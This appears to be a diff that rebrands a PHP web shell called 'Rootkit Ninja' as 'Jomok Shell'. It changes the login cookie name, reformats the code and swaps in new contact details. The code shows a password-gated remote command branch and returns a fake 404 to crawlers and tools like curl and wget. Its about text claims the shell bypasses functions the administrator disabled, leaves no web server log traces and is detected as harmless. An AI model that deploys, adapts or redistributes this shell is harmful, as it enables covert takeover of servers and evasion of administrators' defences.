@@ -13,27 +13,28 @@ $s_login_time = 3600 * 24 * 7; //
 
 
 $s_auth = false; // login status
-if(strlen(trim($s_pass))>0){
-	if(isset($_COOKIE['rootkit_ninja'])){
-		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['rootkit_ninja']))) $s_auth = true;
+if(strlen(trim($s_pass)) > 0){
+	if(isset($_COOKIE['inismoky'])){
+		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['inismoky']))) $s_auth = true;
 	}
 	if(isset($_REQUEST['login'])){
 		$s_login = strtolower(md5(trim($_REQUEST['login'])));
 		if(strtolower(trim($s_pass)) == $s_login){
-			setcookie("rootkit_ninja",$s_login,time() + $s_login_time);
+			setcookie("inismoky", $s_login, time() + $s_login_time);
 			$s_auth = true;
 		}
 	}
-	if(isset($_REQUEST['x']) && ($_REQUEST['x']=='logout')){
-		$s_reload = (isset($_COOKIE['rootkit_ninja_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
-		foreach($_COOKIE as $s_k=>$s_v){
-			setcookie($s_k,"",time() - $s_login_time);
+	if(isset($_REQUEST['x']) && ($_REQUEST['x'] == 'logout')){
+		$s_reload = (isset($_COOKIE['rootkit_ninja_included']) && isset($_COOKIE['s_home'])) ? rtrim(urldecode($_COOKIE['s_self']), "&") : "";
+		foreach($_COOKIE as $s_k => $s_v){
+			setcookie($s_k, "", time() - $s_login_time);
 		}
 		$s_auth = false;
 		if(!empty($s_reload)) header("Location: ".$s_reload);
 	}
 }
 else $s_auth = true;
+
 if(!empty($_REQUEST['s_pass'])){
 	if(strtolower(trim($s_pass)) == strtolower(trim($_REQUEST['s_pass']))){
 		if(isset($_REQUEST['cmd'])){
@@ -52,6 +53,7 @@ if(!empty($_REQUEST['s_pass'])){
 	}
 	die();
 }
+
 if(isset($_SERVER['HTTP_USER_AGENT']) && (preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i', $_SERVER['HTTP_USER_AGENT']))){
 	header("HTTP/1.0 404 Not Found");
 	header("Status: 404 Not Found");
@@ -2083,11 +2085,11 @@ if($s_auth){
 	
 	//tentang
 	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='about')){
-		$s_result .= "<div class='mybox'><h2>About of Rootkit Ninja</h2>
-        <p>Rootkit Ninja - One of a red team consists of security professionals who act as adversaries to overcome cyber security controls.</p>
+		$s_result .= "<div class='mybox'><h2>About of Jomok Shell</h2>
+        <p>Jomok Shell - One of a red team consists of security professionals who act as adversaries to overcome cyber security controls.</p>
         <p>We created this program for testing purposes only, that we can bypass all functions that have been disabled by the system administrator, there are no log traces on apache and nginx, and detected as harmless files by the system.</p>
 		<p>Usage of program without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.</p>
-        <p>e: <a href='mailto:hello@rootkit-ninja.com'>hello@rootkit-ninja.com</a> | w: <a href='https://www.rootkit-ninja.com'>www.rootkit-ninja.com</a></p>
+        <p>e: <a href='mailto:rootaexdy@gmail.com'>rootaexdy@gmail.com</a> | w: <a href='https://hxseoteam.org'>jomok48.com</a></p>
         </div>";
 	}
 
